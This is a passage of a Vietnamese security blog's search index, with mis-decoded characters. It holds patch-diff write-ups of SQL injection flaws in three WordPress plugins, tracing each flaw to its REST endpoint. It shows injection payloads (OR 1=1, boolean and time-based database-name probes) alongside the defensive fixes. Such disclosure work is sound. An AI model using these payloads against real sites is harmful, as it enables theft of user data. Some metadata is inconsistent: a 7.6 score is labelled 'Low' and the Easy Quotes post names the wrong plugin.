0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, scan_id s·∫Ω b·ªã escape.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-32650 trong plugin WordPress Accessibility Suite tr∆∞·ªõc phi√™n b·∫£n 4.19 xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m $wpdb-\u0026gt;prepare() d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Accessibility Suite Plugin \u0026lt;= 4.18 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-32650/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAccessibility Suite\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.19\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-32650\"\u003eCVE-2025-32650\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/online-accessibility/\"\u003eWordPress Accessibility Suite Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 4.18\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccessibility Suite\u003c/strong\u003e:  v4.18(vul) v√† v4.19(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho \u003cstrong\u003einput\u003c/strong\u003e v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng \u003ccode\u003eprepare()\u003c/code\u003e ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\u003c/p\u003e","title":"CVE-2025-32650"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress and Debugging Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;)\u0026#34;; $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;) GROUP BY user_id LIMIT $number OFFSET $offset\u0026#34;; $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.5\u0026quot; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders)\u0026#34;, $keys ); $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026amp; OFFSET (safe with prepare) $final_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\u0026#34;, array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.6\u0026quot; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin.\nK·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:\nretrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php.\nTi·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin.\nH√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php.\nTi·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:\nTa ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress:\nclass ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u0026gt;namespace, // mrm/v1 $this-\u0026gt;rest_base . \u0026#39;/learndash/map\u0026#39;, // contacts/import/learndash/map/ array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::CREATABLE, // POST \u0026#39;callback\u0026#39; =\u0026gt; array( $this-\u0026gt;controller, \u0026#39;map_contacts_with_learndash\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; PermissionManager::current_user_can(\u0026#39;mint_manage_contacts\u0026#39;), // Admin \u0026#39;args\u0026#39; =\u0026gt; array( \u0026#39;selectedCourses\u0026#39; =\u0026gt; array( \u0026#39;description\u0026#39; =\u0026gt; __( \u0026#39;The selected courses from which to import contacts.\u0026#39;, \u0026#39;mrm\u0026#39; ), \u0026#39;required\u0026#39; =\u0026gt; true, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;array\u0026#39;, \u0026#39;sanitize_callback\u0026#39; =\u0026gt; \u0026#39;rest_sanitize_array\u0026#39;, ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m:\nPOST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users Exploit Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value.\nPOST request qua BurpSuite:\nTa g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u0026gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query\nKhi ƒë√≥, c√¢u query tr·ªü th√†nh\nSELECT user_id FROM wp_usermeta WHERE meta_key IN (\u0026#39;course_abc\u0026#39;) OR 1=1 -- _access_from\u0026#39;) GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u0026gt; tr·∫£ v·ªÅ t√¢t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:\n$formatted_users = array_map( function ($user) { $user-\u0026gt;usermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u0026gt;ID) ); return $user; }, $contacts ); Conclusion L·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Mail Mint Plugin \u0026lt;= 1.18.5 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-04-cve-2025-58604/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMail Mint\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.18.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58604\"\u003eCVE-2025-58604\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mail-mint/\"\u003eWordPress Mail Mint Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.18.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Low (7.6)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMail Mint\u003c/strong\u003e:  v1.18.5(vul) v√† v1.18.6(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-58604"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm 